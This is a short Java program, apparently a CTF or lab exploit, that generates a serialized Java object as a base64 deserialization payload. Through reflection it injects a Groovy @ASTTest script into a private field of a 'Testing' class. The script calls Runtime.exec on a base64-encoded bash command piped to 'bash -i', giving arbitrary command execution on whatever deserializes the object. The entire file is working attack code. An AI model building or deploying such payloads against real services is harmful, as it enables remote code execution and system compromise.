package com.example;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

/**
 * Hello world!
 *
 */
public class App 
{
    public static void main( String[] args ) throws Exception {
        Testing t = new Testing("test", 100);

        // get parameters from command line
        String command = args[0];

        // serialize and print it as base64
        // add value to groovyScript using reflection
        Field groovyScriptField = Testing.class.getDeclaredField("groovyScript");
        groovyScriptField.setAccessible(true);

        // set groovyScript to a payload that will execute a command
        String base64Command = new String(java.util.Base64.getEncoder().encode(command.getBytes()));
        String payload = "@groovy.transform.ASTTest(value={\r\n" +
        "    assert java.lang.Runtime.getRuntime().exec(\"bash -c {echo,"+base64Command+"}|{base64,-d}|{bash,-i}\")\r\n" +
        "})\r\n" +
        "def x\r\n" +
        "";
        groovyScriptField.set(t, payload);
        
        // deserialize and print it as base64
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(t);
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }
}
